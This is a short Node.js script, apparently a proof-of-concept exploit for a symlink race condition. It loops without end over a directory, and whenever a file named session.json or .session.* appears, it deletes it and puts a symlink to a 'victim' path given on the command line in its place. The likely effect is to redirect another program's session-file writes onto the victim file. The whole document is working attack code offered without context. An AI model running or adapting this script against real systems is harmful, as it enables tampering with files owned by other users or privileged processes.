const fs = require("node:fs")
const [dir, victim] = process.argv.slice(2)
for (;;) {
  try {
    for (const name of fs.readdirSync(dir)) {
      if (name !== "session.json" && !name.startsWith(".session.")) continue
      const candidate = `${dir}/${name}`
      try { fs.unlinkSync(candidate) } catch {}
      try { fs.symlinkSync(victim, candidate) } catch {}
    }
  } catch {}
}
